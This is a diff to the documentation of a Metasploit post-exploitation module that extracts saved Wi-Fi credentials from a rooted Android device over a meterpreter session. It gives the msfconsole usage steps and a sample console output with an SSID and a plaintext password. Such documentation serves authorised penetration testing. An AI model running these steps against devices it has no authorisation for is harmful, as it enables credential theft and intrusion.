@@ -1,18 +1,14 @@
 ## Vulnerable Application
 
-  This post-exploitation module will extract saved wireless AccessPoint
-  credentials from the target android device.
+  This post-exploitation module will extract all saved Wireless access point credentials from the target android device.
 
 ## Verification Steps
 
   1. Start `msfconsole`
-  2. Get meterpreter session
-  3. Make sure the session is **root**
-  4. Do: `use post/android/gather/wireless_ap`
-  5. Do: `set SESSION <session id>`
-  6. Do: `run`
-  7. You should be able to see the extracted bssids and passwords of wireless
-     APs
+  2. Get a *root* meterpreter session (use exploit/android/local/...)
+  3. Do: `use post/android/gather/wireless_ap`
+  4. Do: `set SESSION <session id>`
+  5. Do: `run`
 
 ## Options
 
@@ -20,12 +16,12 @@
 
 ## Extracted data
 
-  - Wireless AP creds
+  - Wireless AP credentials (SSID, network type and password)
 
 ## Example Scenario
 
 
-  ```
+```
 msf5 exploit(multi/handler) > use post/android/gather/wireless_ap
 msf5 post(android/gather/wireless_ap) > set session 1
 session => 1
@@ -42,6 +38,7 @@ Wireless APs
  Troika                WPA-PSK   ika@12345
  
 
+[+] Secrets stored in: ~/.msf4/loot/...wireless.ap.cred_...txt
 [*] Post module execution completed
 msf5 post(android/gather/wireless_ap) >
-  ```
+```
